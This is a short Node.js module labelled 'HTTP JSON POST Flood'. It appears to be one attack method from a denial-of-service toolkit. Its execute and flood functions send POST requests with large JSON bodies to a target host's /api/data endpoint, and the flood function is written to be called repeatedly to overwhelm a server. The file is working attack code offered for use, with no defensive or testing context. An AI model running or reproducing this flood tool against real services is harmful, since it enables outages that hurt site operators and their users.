const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP JSON POST Flood',
    description: 'POST requests with large JSON payloads',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const jsonData = JSON.stringify({
            data: 'x'.repeat(1000),
            timestamp: Date.now(),
            random: Math.random()
        });
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/api/data',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(jsonData)
                }
            }, (res) => {
                resolve({ status: res.statusCode, size: jsonData.length });
                req.destroy();
            });
            
            req.write(jsonData);
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const jsonData = JSON.stringify({ x: 'x'.repeat(5000) });
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/api/data',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.write(jsonData);
        req.end();
        req.on('error', () => callback(false));
    }
};